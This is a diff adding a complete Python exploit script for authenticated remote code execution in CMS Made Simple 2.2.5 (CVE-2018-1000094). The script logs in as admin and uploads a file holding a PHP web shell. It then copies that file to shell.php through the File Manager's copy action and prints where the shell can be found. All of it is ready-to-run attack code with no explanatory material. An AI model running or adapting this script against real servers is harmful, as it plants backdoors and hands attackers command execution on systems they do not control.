@@ -1,0 +1,103 @@
+# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
+# Date: 3rd of July, 2018
+# Exploit Author: Mustafa Hasan (@strukt93)
+# Vendor Homepage: http://www.cmsmadesimple.org/
+# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
+# Version: 2.2.5
+# CVE: CVE-2018-1000094
+
+import requests
+import base64
+
+base_url = "http://192.168.1.10/cmsms/admin"
+upload_dir = "/uploads"
+upload_url = base_url.split('/admin')[0] + upload_dir
+username = "admin"
+password = "password"
+
+csrf_param = "__c"
+txt_filename = 'cmsmsrce.txt'
+php_filename = 'shell.php'
+payload = "<?php system($_GET['cmd']);?>"
+
+def parse_csrf_token(location):
+    return location.split(csrf_param + "=")[1]
+
+def authenticate():
+    page = "/login.php"
+    url = base_url + page
+    data = {
+        "username": username,
+        "password": password,
+        "loginsubmit": "Submit"
+    }
+    response  = requests.post(url, data=data, allow_redirects=False)
+    status_code = response.status_code
+    if status_code == 302:
+        print "[+] Authenticated successfully with the supplied credentials"
+        return response.cookies, parse_csrf_token(response.headers['Location'])
+    print "[-] Authentication failed"
+    return None, None
+
+def upload_txt(cookies, csrf_token):
+    mact = "FileManager,m1_,upload,0"
+    page = "/moduleinterface.php"
+    url = base_url + page
+    data = {
+        "mact": mact,
+        csrf_param: csrf_token,
+        "disable_buffer": 1
+    }
+    txt = {
+        'm1_files[]': (txt_filename, payload)
+    }
+    print "[*] Attempting to upload {}...".format(txt_filename)
+    response = requests.post(url, data=data, files=txt, cookies=cookies)
+    status_code = response.status_code
+    if status_code == 200:
+        print "[+] Successfully uploaded {}".format(txt_filename)
+        return True
+    print "[-] An error occurred while uploading {}".format(txt_filename)
+    return None
+
+def copy_to_php(cookies, csrf_token):
+    mact = "FileManager,m1_,fileaction,0"
+    page = "/moduleinterface.php"
+    url = base_url + page
+    b64 = base64.b64encode(txt_filename)
+    serialized = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)
+    data = {
+        "mact": mact,
+        csrf_param: csrf_token,
+        "m1_fileactioncopy": "",
+        "m1_path": upload_dir,
+        "m1_selall": serialized,
+        "m1_destdir": "/",
+        "m1_destname": php_filename,
+        "m1_submit": "Copy"
+    }
+    print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
+    status_code = response.status_code
+    if status_code == 302:
+        if response.headers['Location'].endswith('copysuccess'):
+            print "[+] File copied successfully"
+            return True
+    print "[-] An error occurred while copying, maybe {} already exists".format(php_filename)
+    return None    
+
+def quit():
+    print "[-] Exploit failed"
+    exit()
+
+def run():
+    cookies,csrf_token = authenticate()
+    if not cookies:
+        quit()
+    if not upload_txt(cookies, csrf_token):
+        quit()
+    if not copy_to_php(cookies, csrf_token):
+        quit()
+    print "[+] Exploit succeeded, shell can be found at: {}".format(upload_url + '/' + php_filename)
+
+run()
